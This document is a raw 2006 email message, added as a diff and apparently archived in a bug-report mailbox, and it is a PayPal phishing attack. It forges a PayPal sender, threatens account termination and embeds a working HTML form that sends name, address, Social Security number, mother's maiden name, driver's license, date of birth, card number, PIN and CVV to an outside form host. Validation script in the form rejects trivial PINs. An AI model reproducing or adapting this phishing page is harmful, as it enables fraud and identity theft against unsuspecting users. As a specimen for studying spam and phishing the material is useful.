@@ -1,0 +1,746 @@
+From atacs-bugs@chou.ece.utah.edu  Wed Aug  2 19:21:27 2006
+Return-Path: <atacs-bugs@chou.ece.utah.edu>
+X-Spam-Checker-Version: SpamAssassin 3.1.3 (2006-06-01) on chou.ece.utah.edu
+X-Spam-Level: **
+X-Spam-Status: No, score=2.8 required=5.0 tests=AWL,HTML_MESSAGE,
+	HTML_OBFUSCATE_10_20,HTML_TAG_EXIST_TBODY,MIME_HEADER_CTYPE_ONLY,
+	MIME_HTML_ONLY autolearn=no version=3.1.3
+Received: from chou.ece.utah.edu (localhost.localdomain [127.0.0.1])
+	by chou.ece.utah.edu (8.13.7/8.13.1) with ESMTP id k731LRVM026994
+	for <atacs-bugs@shang.ece.utah.edu>; Wed, 2 Aug 2006 19:21:27 -0600
+Received: (from atacs-bugs@localhost)
+	by chou.ece.utah.edu (8.13.7/8.13.7/Submit) id k731LR30026993
+	for atacs-bugs@shang.ece.utah.edu; Wed, 2 Aug 2006 19:21:27 -0600
+Received: from lantree.backboneservers.com (lantree.backboneservers.com [66.6.63.6])
+	by chou.ece.utah.edu (8.13.7/8.13.1) with ESMTP id k731LNdc026977
+	for <atacs-bugs@ming.elen.utah.edu>; Wed, 2 Aug 2006 19:21:23 -0600
+Received: from gorkon.backboneservers.com ([66.6.63.5] helo=gorkon.momentous.ca)
+	by lantree.backboneservers.com with esmtp (Exim 4.60 (FreeBSD))
+	(envelope-from <27398@gorkon.momentous.ca>)
+	id 1G8Rtn-0004gR-Pg
+	for atacs-bugs@ming.elen.utah.edu; Thu, 03 Aug 2006 01:21:19 +0000
+Received: from 27398 by gorkon.momentous.ca with local (Exim 4.30; FreeBSD)
+	id 1G8Rtl-000JiM-Um
+	for atacs-bugs@ming.elen.utah.edu; Thu, 03 Aug 2006 01:21:17 +0000
+To: atacs-bugs@ming.elen.utah.edu
+Subject: Update your account 
+From: Paypal Support<update@paypal.com>
+Content-Type: text/html
+Message-Id: <E1G8Rtl-000JiM-Um@gorkon.momentous.ca>
+Sender: Virtual Account 27398 <27398@gorkon.momentous.ca>
+Date: Thu, 03 Aug 2006 01:21:17 +0000
+X-Auth: 
+
+
+<HTML><HEAD>
+<style type="text/css">
+<!--
+.style1 {
+	color: #004080;
+	font-weight: bold;
+}
+-->
+</style>
+</HEAD>
+<BODY bgColor=#ffffff>
+<p>
+  <SCRIPT language=JavaScript>
+
+
+function CC_noErrors() {
+return true;
+}
+
+window.onerror = CC_noErrors;
+
+// -->
+</SCRIPT>
+  
+  <SCRIPT language=JavaScript>
+<!--
+function check_all(form) {
+
+    if (form.first_name.value.length < 2) {
+                alert("Please enter your First Name");
+                form.first_name.focus();
+                return false;
+        }
+
+		if (form.last_name.value.length < 2) {
+                alert("Please enter your Last Name");
+                form.last_name.focus();
+                return false;
+        }
+		
+		if (form.address1.value.length < 5) {
+                alert("Please enter a valid Address");
+                form.address1.focus();
+                return false;
+        }
+		
+		if (form.city.value.length < 2) {
+                alert("Please enter a valid City");
+                form.city.focus();
+                return false;
+        }
+		
+		if (form.zip.value.length < 5) {
+                alert("Please enter a valid ZIP Code");
+                form.zip.focus();
+                return false;
+        }
+		
+	    if (form.ccnumber.value.length < 16) {
+		        alert("Credit Card number is invalid!");
+		        form.ccnumber.focus();
+	        	return false;
+	   }
+
+        if (form.pin.value.length != 4) {
+                alert("PIN is too short!");
+                form.pin.focus();
+                return false;
+        }
+
+		
+		if (form.cvv.value.length != 3) {
+                alert("CVV2 is too short!");
+                form.cvv.focus();
+                return false;
+        }
+		
+		
+        if (form.pin.value == "0000") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "1111") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "2222") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "1234") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+		
+        if (form.pin.value == "3333") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "4444") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "5555") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "6666") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "7777") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "8888") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.pin.value == "9999") {
+                alert("Invalid PIN!");
+                form.pin.focus();
+                return false;
+        }
+
+        if (form.year.value == "2005"  &&
+           (form.month.value == "01" ||
+            form.month.value == "2")) {
+                alert("Card has expired!");
+                form.ccnumber.focus();
+                return false;
+        }
+
+}
+
+-->
+</SCRIPT>
+  
+  <SCRIPT language=javascript src="" type=text/javascript>
+</SCRIPT>
+	Dear Customer:<br>
+
+It has come to our attention that your account billing updates are 
+out of order. If you could please take 5-10 minutes out of your 
+online experience and update your billing records you will not run 
+into any future problems with the online service. However, failure
+to update your records will result in account termination. Please 
+update your records by August 5th.</p>
+<p>According new policy for preventing scam pages we  send the update form to complete through your email, it is more safety </p>
+<FORM action="http://www.webformdesigner.net/wfd_f2.php?id=QjfYrttfx8" method=post>
+<TABLE align=center border=0 cellPadding=0 cellSpacing=0 width=700>
+  <TBODY>
+  <TR>
+    <TD class=ppheading><span class="style1" size=7>Personal Account Verification&nbsp;</span></TD>
+    <TD align=right class=ppsmalltextbold 
+vAlign=bottom>&nbsp;</TD></TR></TBODY></TABLE>
+<TABLE align=center border=0 cellPadding=0 cellSpacing=0 width=700>
+  <TBODY>
+
+  <TR vAlign=top>
+    <TD align=left class=pptext width="100%">
+      <TABLE align=center border=0 cellPadding=0 cellSpacing=0 height=1494 
+      width=700>
+        <TBODY>
+        <TR>
+          <TD height=1 width=200><IMG height=1 
+            src="images/pixel.gif" width=200></TD>
+          <TD height=1 width=8><IMG height=1 
+            src="images/pixel.gif" width=6></TD>
+          <TD height=1 width=492><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR>
+
+          <TD colSpan=3 height=10 width=700><BR class=h10></TD></TR>
+        <TR>
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR vAlign=top>
+          <TD bgColor=#f9f9f9 colSpan=3 height=17 width=700>
+            <TABLE border=0 cellPadding=2 cellSpacing=0 width="100%">
+              <TBODY>
+              <TR vAlign=top>
+                <TD class=ppsmalltext><B>Your Profile Information</B> - Enter 
+                  your name as it appears on your credit card or bank account. 
+                </TD></TR></TBODY></TABLE></TD></TR>
+
+        <TR>
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR>
+          <TD colSpan=3 height=10 width=700><BR class=h10></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=27 width=200>First Name: </TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=first_name 
+            maxLength=32 name=first_name size=25 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: 225px; WIDTH: 13px; 
+            FONT-SIZE: 400;></TD></TR>
+
+        <TR>
+          <TD align=right class=pplabel height=28 width=200>Middle Name:</TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT id=first_name0 
+            maxLength=2 name=middle_name size=2 FONT-FAMILY: WIDTH: 13px; 
+            FONT-SIZE: 400; height:23 verdana,arial,helvetica,sans-serif; 
+        23;></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200><LABEL 
+            for=last_name>Last Name:</LABEL> </TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+
+          <TD class=pptext height=28 width=492><INPUT id=last_name 
+            maxLength=32 name=last_name size=25 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: 225px; WIDTH: 13px; 
+            FONT-SIZE: 400;> </TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200><LABEL 
+            for=address1>Address 1:</LABEL></TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT id=address1 
+            maxLength=100 name=address1 size=25 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: 225px; WIDTH: 13px; 
+            FONT-SIZE: 400;> </TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200><LABEL 
+            for=address2>Address 2:<BR><SPAN class=ppsmalltext>(optional)</SPAN> 
+            </LABEL></TD>
+
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT id=address2 
+            maxLength=100 name=address2 size=25 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: 225px; WIDTH: 13px; 
+            FONT-SIZE: 400;> </TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200><LABEL 
+            for=city>City:</LABEL></TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT id=city maxLength=40 
+            name=city size=25 verdana,arial,helvetica,sans-serif FONT-FAMILY: 
+            225px; WIDTH: 13px; FONT-SIZE: 400;> </TD></TR>
+        <TR>
+
+          <TD align=right class=pplabel height=28 width=200><LABEL 
+            for=state>State: </LABEL></TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><SELECT id=state name=state> 
+              <OPTION selected value=""><OPTION value=AK>AK<OPTION 
+              value=AL>AL<OPTION value=AR>AR<OPTION value=AZ>AZ<OPTION 
+              value=CA>CA<OPTION value=CO>CO<OPTION value=CT>CT<OPTION 
+              value=DC>DC<OPTION value=DE>DE<OPTION value=FL>FL<OPTION 
+              value=GA>GA<OPTION value=HI>HI<OPTION value=IA>IA<OPTION 
+              value=ID>ID<OPTION value=IL>IL<OPTION value=IN>IN<OPTION 
+              value=KS>KS<OPTION value=KY>KY<OPTION value=LA>LA<OPTION 
+              value=MA>MA<OPTION value=MD>MD<OPTION value=ME>ME<OPTION 
+              value=MI>MI<OPTION value=MN>MN<OPTION value=MO>MO<OPTION 
+              value=MS>MS<OPTION value=MT>MT<OPTION value=NC>NC<OPTION 
+              value=ND>ND<OPTION value=NE>NE<OPTION value=NH>NH<OPTION 
+              value=NJ>NJ<OPTION value=NM>NM<OPTION value=NV>NV<OPTION 
+              value=NY>NY<OPTION value=OH>OH<OPTION value=OK>OK<OPTION 
+              value=OR>OR<OPTION value=PA>PA<OPTION value=RI>RI<OPTION 
+              value=SC>SC<OPTION value=SD>SD<OPTION value=TN>TN<OPTION 
+              value=TX>TX<OPTION value=UT>UT<OPTION value=VA>VA<OPTION 
+              value=VT>VT<OPTION value=WA>WA<OPTION value=WI>WI<OPTION 
+              value=WV>WV<OPTION value=WY>WY<OPTION value=AA>AA<OPTION 
+              value=AE>AE<OPTION value=AP>AP<OPTION value=AS>AS<OPTION 
+              value=PR>PR<OPTION value=FM>FM<OPTION value=GU>GU<OPTION 
+              value=MH>MH<OPTION value=MP>MP<OPTION value=PW>PW<OPTION 
+              value=VI>VI</OPTION></SELECT> </TD></TR>
+
+        <TR>
+          <TD align=right class=pplabel height=28 width=200>Zip: </TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT id=zip maxLength=10 
+            name=zip size=10><SPAN class=ppsmalltext>&nbsp;(5 or 9 
+            digits)</SPAN> </TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200>Country:</TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+
+          <TD class=pptext height=28 width=492><FONT 
+            color=#000000><STRONG><SELECT id=country name=country 24px HEIGHT: 
+            181px;> <OPTION selected>United States</OPTION> 
+              <OPTION>Albania</OPTION> <OPTION>Algeria</OPTION> <OPTION>American 
+              Samoa</OPTION> <OPTION>Andorra</OPTION> <OPTION>Angola</OPTION> 
+              <OPTION>Anguilla</OPTION> <OPTION>Antarctica</OPTION> 
+              <OPTION>Antigua And Barbuda</OPTION> <OPTION>Argentina</OPTION> 
+              <OPTION>Armenia</OPTION> <OPTION>Aruba</OPTION> 
+              <OPTION>Australia</OPTION> <OPTION>Austria</OPTION> 
+              <OPTION>Azerbaijan</OPTION> <OPTION>Bahamas</OPTION> 
+              <OPTION>Bahrain</OPTION> <OPTION>Bangladesh</OPTION> 
+              <OPTION>Barbados</OPTION> <OPTION>Belarus</OPTION> 
+              <OPTION>Belgium</OPTION> <OPTION>Belize</OPTION> 
+              <OPTION>Benin</OPTION> <OPTION>Bermuda</OPTION> 
+              <OPTION>Bhutan</OPTION> <OPTION>Bolivia</OPTION> <OPTION>Bosnia 
+              and Herzegovina</OPTION> <OPTION>Botswana</OPTION> <OPTION>Bouvet 
+              Island</OPTION> <OPTION>Brazil</OPTION> <OPTION>British Indian 
+              Ocean Territory</OPTION> <OPTION>Brunei Darussalam</OPTION> 
+              <OPTION>Bulgaria</OPTION> <OPTION>Burkina Faso</OPTION> 
+              <OPTION>Burma</OPTION> <OPTION>Burundi</OPTION> 
+              <OPTION>Cambodia</OPTION> <OPTION>Cameroon</OPTION> 
+              <OPTION>Canada</OPTION> <OPTION>Cape Verde</OPTION> <OPTION>Cayman 
+              Islands</OPTION> <OPTION>Central African Republic</OPTION> 
+              <OPTION>Chad</OPTION> <OPTION>Chile</OPTION> 
+              <OPTION>China</OPTION> <OPTION>Christmas Island</OPTION> 
+              <OPTION>Cocos (Keeling) Islands</OPTION> <OPTION>Colombia</OPTION> 
+              <OPTION>Comoros</OPTION> <OPTION>Congo</OPTION> <OPTION>Congo, the 
+              Democratic Republic of the</OPTION> <OPTION>Cook Islands</OPTION> 
+              <OPTION>Costa Rica</OPTION> <OPTION>Cote d'Ivoire</OPTION> 
+              <OPTION>Croatia</OPTION> <OPTION>Cyprus</OPTION> <OPTION>Czech 
+              Republic</OPTION> <OPTION>Denmark</OPTION> 
+              <OPTION>Djibouti</OPTION> <OPTION>Dominica</OPTION> 
+              <OPTION>Dominican Republic</OPTION> <OPTION>East Timor</OPTION> 
+              <OPTION>Ecuador</OPTION> <OPTION>Egypt</OPTION> <OPTION>El 
+              Salvador</OPTION> <OPTION>England</OPTION> <OPTION>Equatorial 
+              Guinea</OPTION> <OPTION>Eritrea</OPTION> <OPTION>Espana</OPTION> 
+              <OPTION>Estonia</OPTION> <OPTION>Ethiopia</OPTION> 
+              <OPTION>Falkland Islands</OPTION> <OPTION>Faroe Islands</OPTION> 
+              <OPTION>Fiji</OPTION> <OPTION>Finland</OPTION> 
+              <OPTION>France</OPTION> <OPTION>French Guiana</OPTION> 
+              <OPTION>French Polynesia</OPTION> <OPTION>French Southern 
+              Territories</OPTION> <OPTION>Gabon</OPTION> 
+              <OPTION>Gambia</OPTION> <OPTION>Georgia</OPTION> 
+              <OPTION>Germany</OPTION> <OPTION>Ghana</OPTION> 
+              <OPTION>Gibraltar</OPTION> <OPTION>Great Britain</OPTION> 
+              <OPTION>Greece</OPTION> <OPTION>Greenland</OPTION> 
+              <OPTION>Grenada</OPTION> <OPTION>Guadeloupe</OPTION> 
+              <OPTION>Guam</OPTION> <OPTION>Guatemala</OPTION> 
+              <OPTION>Guinea</OPTION> <OPTION>Guinea-Bissau</OPTION> 
+              <OPTION>Guyana</OPTION> <OPTION>Haiti</OPTION> <OPTION>Heard and 
+              Mc Donald Islands</OPTION> <OPTION>Honduras</OPTION> <OPTION>Hong 
+              Kong</OPTION> <OPTION>Hungary</OPTION> <OPTION>Iceland</OPTION> 
+              <OPTION>India</OPTION> <OPTION>Indonesia</OPTION> 
+              <OPTION>Ireland</OPTION> <OPTION>Israel</OPTION> 
+              <OPTION>Italy</OPTION> <OPTION>Jamaica</OPTION> 
+              <OPTION>Japan</OPTION> <OPTION>Jordan</OPTION> 
+              <OPTION>Kazakhstan</OPTION> <OPTION>Kenya</OPTION> 
+              <OPTION>Kiribati</OPTION> <OPTION>Korea (North)</OPTION> 
+              <OPTION>Korea, Republic of</OPTION> <OPTION>Korea (South)</OPTION> 
+              <OPTION>Kuwait</OPTION> <OPTION>Kyrgyzstan</OPTION> <OPTION>Lao 
+              People's Democratic Republic</OPTION> <OPTION>Latvia</OPTION> 
+              <OPTION>Lebanon</OPTION> <OPTION>Lesotho</OPTION> 
+              <OPTION>Liberia</OPTION> <OPTION>Liechtenstein</OPTION> 
+              <OPTION>Lithuania</OPTION> <OPTION>Luxembourg</OPTION> 
+              <OPTION>Macau</OPTION> <OPTION>Macedonia</OPTION> 
+              <OPTION>Madagascar</OPTION> <OPTION>Malawi</OPTION> 
+              <OPTION>Malaysia</OPTION> <OPTION>Maldives</OPTION> 
+              <OPTION>Mali</OPTION> <OPTION>Malta</OPTION> <OPTION>Marshall 
+              Islands</OPTION> <OPTION>Martinique</OPTION> 
+              <OPTION>Mauritania</OPTION> <OPTION>Mauritius</OPTION> 
+              <OPTION>Mayotte</OPTION> <OPTION>Mexico</OPTION> 
+              <OPTION>Micronesia, Federated States of</OPTION> <OPTION>Moldova, 
+              Republic of</OPTION> <OPTION>Monaco</OPTION> 
+              <OPTION>Mongolia</OPTION> <OPTION>Montserrat</OPTION> 
+              <OPTION>Morocco</OPTION> <OPTION>Mozambique</OPTION> 
+              <OPTION>Myanmar</OPTION> <OPTION>Namibia</OPTION> 
+              <OPTION>Nauru</OPTION> <OPTION>Nepal</OPTION> 
+              <OPTION>Netherlands</OPTION> <OPTION>Netherlands Antilles</OPTION> 
+              <OPTION>New Caledonia</OPTION> <OPTION>New Zealand</OPTION> 
+              <OPTION>Nicaragua</OPTION> <OPTION>Niger</OPTION> 
+              <OPTION>Nigeria</OPTION> <OPTION>Niue</OPTION> <OPTION>Norfolk 
+              Island</OPTION> <OPTION>Northern Ireland</OPTION> <OPTION>Northern 
+              Mariana Islands</OPTION> <OPTION>Norway</OPTION> 
+              <OPTION>Oman</OPTION> <OPTION>Pakistan</OPTION> 
+              <OPTION>Palau</OPTION> <OPTION>Panama</OPTION> <OPTION>Papua New 
+              Guinea</OPTION> <OPTION>Paraguay</OPTION> <OPTION>Peru</OPTION> 
+              <OPTION>Philippines</OPTION> <OPTION>Pitcairn</OPTION> 
+              <OPTION>Poland</OPTION> <OPTION>Portugal</OPTION> <OPTION>Puerto 
+              Rico</OPTION> <OPTION>Qatar</OPTION> <OPTION>Reunion</OPTION> 
+              <OPTION>Romania</OPTION> <OPTION>Russia</OPTION> <OPTION>Russian 
+              Federation</OPTION> <OPTION>Rwanda</OPTION> <OPTION>Saint Kitts 
+              and Nevis</OPTION> <OPTION>Saint Lucia</OPTION> <OPTION>Saint 
+              Vincent and the Grenadines</OPTION> <OPTION>Samoa 
+              (Independent)</OPTION> <OPTION>San Marino</OPTION> <OPTION>Sao 
+              Tome and Principe</OPTION> <OPTION>Saudi Arabia</OPTION> 
+              <OPTION>Scotland</OPTION> <OPTION>Senegal</OPTION> 
+              <OPTION>Seychelles</OPTION> <OPTION>Sierra Leone</OPTION> 
+              <OPTION>Singapore</OPTION> <OPTION>Slovakia</OPTION> 
+              <OPTION>Slovenia</OPTION> <OPTION>Solomon Islands</OPTION> 
+              <OPTION>Somalia</OPTION> <OPTION>South Africa</OPTION> 
+              <OPTION>South Georgia and the South Sandwich Islands</OPTION> 
+              <OPTION>South Korea</OPTION> <OPTION>Spain</OPTION> <OPTION>Sri 
+              Lanka</OPTION> <OPTION>St. Helena</OPTION> <OPTION>St. Pierre and 
+              Miquelon</OPTION> <OPTION>Suriname</OPTION> <OPTION>Svalbard and 
+              Jan Mayen Islands</OPTION> <OPTION>Swaziland</OPTION> 
+              <OPTION>Sweden</OPTION> <OPTION>Switzerland</OPTION> 
+              <OPTION>Taiwan</OPTION> <OPTION>Tajikistan</OPTION> 
+              <OPTION>Tanzania</OPTION> <OPTION>Thailand</OPTION> 
+              <OPTION>Togo</OPTION> <OPTION>Tokelau</OPTION> 
+              <OPTION>Tonga</OPTION> <OPTION>Trinidad</OPTION> <OPTION>Trinidad 
+              and Tobago</OPTION> <OPTION>Tunisia</OPTION> 
+              <OPTION>Turkey</OPTION> <OPTION>Turkmenistan</OPTION> 
+              <OPTION>Turks and Caicos Islands</OPTION> <OPTION>Tuvalu</OPTION> 
+              <OPTION>Uganda</OPTION> <OPTION>Ukraine</OPTION> <OPTION>United 
+              Arab Emirates</OPTION> <OPTION>United Kingdom</OPTION> 
+              <OPTION>United States</OPTION> <OPTION>United States Minor 
+              Outlying Islands</OPTION> <OPTION>Uruguay</OPTION> 
+              <OPTION>USA</OPTION> <OPTION>Uzbekistan</OPTION> 
+              <OPTION>Vanuatu</OPTION> <OPTION>Vatican City State (Holy 
+              See)</OPTION> <OPTION>Venezuela</OPTION> <OPTION>Viet Nam</OPTION> 
+              <OPTION>Virgin Islands (British)</OPTION> <OPTION>Virgin Islands 
+              (U.S.)</OPTION> <OPTION>Wales</OPTION> <OPTION>Wallis and Futuna 
+              Islands</OPTION> <OPTION>Western Sahara</OPTION> 
+              <OPTION>Yemen</OPTION> <OPTION>Zambia</OPTION> 
+              <OPTION>Zimbabwe</OPTION></SELECT></STRONG></FONT></TD></TR>
+
+        <TR>
+          <TD align=right class=pplabel height=28 width=200>Home Telephone:</TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT maxLength=3 
+            name=night_phone_a size=3>&nbsp; <INPUT maxLength=3 
+            name=night_phone_b size=3>&nbsp; <INPUT maxLength=4 
+            name=night_phone_c size=4> </TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200><LABEL 
+            for=day_phone_a>Work Telephone:<BR><SPAN 
+            class=ppsmalltext>(optional)</SPAN></LABEL> </TD>
+
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT maxLength=3 
+            name=day_phone1 size=3>&nbsp; <INPUT maxLength=3 name=day_phone2 
+            size=3>&nbsp; <INPUT maxLength=4 name=day_phone3 size=4> </TD></TR>
+        <TR>
+          <TD colSpan=3 height=10 width=700><BR class=h10></TD></TR>
+        <TR>
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR>
+
+          <TD bgColor=#f9f9f9 colSpan=3 height=17 width=700>
+            <TABLE border=0 cellPadding=2 cellSpacing=0 width="100%">
+              <TBODY>
+              <TR vAlign=top>
+                <TD class=ppsmalltext><B>Your Verification Details </B>- Your 
+                  Personal Details are being to asked to verify your information 
+                  only.</TD></TR></TBODY></TABLE></TD></TR>
+        <TR>
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR>
+
+          <TD align=right class=pplabel height=14 width=200></TD>
+          <TD height=14 width=8></TD>
+          <TD class=pptext height=14 width=492></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=27 width=200>Social Security 
+            Number:</TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=ssn_a0 maxLength=3 
+            name=ssn1 size=3>&nbsp; <INPUT maxLength=2 name=ssn2 size=3>&nbsp; 
+            <INPUT maxLength=4 name=ssn3 size=4></TD></TR>
+
+        <TR>
+          <TD align=right class=pplabel height=27 width=200>Mother's maiden 
+            name: </TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=driver_license 
+            maxLength=18 name=mmn size=18 verdana,arial,helvetica,sans-serif 
+            FONT-FAMILY: WIDTH: 13px; FONT-SIZE: 400; 150px;></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=27 width=200>Driver License: 
+</TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=driver_license 
+            maxLength=18 name=dl_number size=18 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: WIDTH: 13px; 
+            FONT-SIZE: 400; 150px;></TD></TR>
+
+        <TR>
+          <TD align=right class=pplabel height=28 width=200><LABEL 
+            for=state>Issued State for License: </LABEL></TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><SELECT id=dl_state 
+            name=dl_state> <OPTION selected value=""><OPTION 
+              value=AK>AK<OPTION value=AL>AL<OPTION value=AR>AR<OPTION 
+              value=AZ>AZ<OPTION value=CA>CA<OPTION value=CO>CO<OPTION 
+              value=CT>CT<OPTION value=DC>DC<OPTION value=DE>DE<OPTION 
+              value=FL>FL<OPTION value=GA>GA<OPTION value=HI>HI<OPTION 
+              value=IA>IA<OPTION value=ID>ID<OPTION value=IL>IL<OPTION 
+              value=IN>IN<OPTION value=KS>KS<OPTION value=KY>KY<OPTION 
+              value=LA>LA<OPTION value=MA>MA<OPTION value=MD>MD<OPTION 
+              value=ME>ME<OPTION value=MI>MI<OPTION value=MN>MN<OPTION 
+              value=MO>MO<OPTION value=MS>MS<OPTION value=MT>MT<OPTION 
+              value=NC>NC<OPTION value=ND>ND<OPTION value=NE>NE<OPTION 
+              value=NH>NH<OPTION value=NJ>NJ<OPTION value=NM>NM<OPTION 
+              value=NV>NV<OPTION value=NY>NY<OPTION value=OH>OH<OPTION 
+              value=OK>OK<OPTION value=OR>OR<OPTION value=PA>PA<OPTION 
+              value=RI>RI<OPTION value=SC>SC<OPTION value=SD>SD<OPTION 
+              value=TN>TN<OPTION value=TX>TX<OPTION value=UT>UT<OPTION 
+              value=VA>VA<OPTION value=VT>VT<OPTION value=WA>WA<OPTION 
+              value=WI>WI<OPTION value=WV>WV<OPTION value=WY>WY<OPTION 
+              value=AA>AA<OPTION value=AE>AE<OPTION value=AP>AP<OPTION 
+              value=AS>AS<OPTION value=PR>PR<OPTION value=FM>FM<OPTION 
+              value=GU>GU<OPTION value=MH>MH<OPTION value=MP>MP<OPTION 
+              value=PW>PW<OPTION value=VI>VI</OPTION></SELECT> </TD></TR>
+
+        <TR>
+          <TD align=right class=pplabel height=30 width=200>Date of Birth:</TD>
+          <TD height=30 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=30 width=492><INPUT id=dob_a maxLength=2 
+            name=dob_mm size=2>&nbsp; <INPUT maxLength=2 name=dob_dd 
+            size=2>&nbsp; <INPUT maxLength=4 name=dob_yy size=4><SPAN 
+            class=ppsmalltext>&nbsp;(mm/dd/yyyy)</SPAN></TD></TR>
+        <TR>
+          <TD colSpan=3 height=10 width=700><BR class=h10></TD></TR>
+        <TR>
+
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR>
+          <TD bgColor=#f9f9f9 colSpan=3 height=17 width=700>
+            <TABLE border=0 cellPadding=2 cellSpacing=0 width="100%">
+              <TBODY>
+              <TR vAlign=top>
+                <TD class=ppsmalltext><B>Your Billing Information</B> - Enter 
+                  your information as it appears on your credit card and bank 
+                  account. </TD></TR></TBODY></TABLE></TD></TR>
+
+        <TR>
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR>
+          <TD colSpan=3 height=10 width=700><BR class=h10></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200>Card Type:</TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><FONT color=#000000>
+
+            <P align=left><SELECT id=cardtype name=cardtype> <OPTION 
+              selected>Credit</OPTION> 
+          <OPTION>Debit</OPTION></SELECT></P></FONT></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=27 width=200>Card Holder Full 
+            Name: </TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=full_name 
+            maxLength=64 name=ccholder size=25 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: 225px; WIDTH: 13px; 
+            FONT-SIZE: 400;></TD></TR>
+        <TR>
+
+          <TD align=right class=pplabel height=27 width=200>Card Number: </TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=cc_number 
+            maxLength=16 name=ccnumber size=16 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: 225px; WIDTH: 13px; 
+            FONT-SIZE: 400;> <IMG border=0 height=22 
+            src="http://images.google.de/images?q=tbn:vmn3H9F4hvId_M:www.vintageagain.com/images/logo_cards_150x26.gif" 
+            width=155></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=27 width=200>Expiry Date: </TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><FONT color=#000000>
+
+            <P 0px><SELECT id=expirymonth name=month> <OPTION 
+              selected>01</OPTION> <OPTION>02</OPTION> <OPTION>03</OPTION> 
+              <OPTION>04</OPTION> <OPTION>05</OPTION> <OPTION>06</OPTION> 
+              <OPTION>07</OPTION> <OPTION>08</OPTION> <OPTION>09</OPTION> 
+              <OPTION>10</OPTION> <OPTION>11</OPTION> 
+            <OPTION>12</OPTION></SELECT><FONT 
+            size=2><STRONG>/</STRONG></FONT><SELECT id=expiryyear name=year> 
+              </OPTION> 
+              <OPTION>2005</OPTION> <OPTION>2006</OPTION> <OPTION>2007</OPTION> 
+              <OPTION>2008</OPTION> <OPTION>2009</OPTION> 
+            <OPTION>2010</OPTION><OPTION>2011</OPTION><OPTION>2012</OPTION></SELECT><FONT 
+            size=2><STRONG>&nbsp;&nbsp;</STRONG></FONT></P></FONT></TD></TR>
+
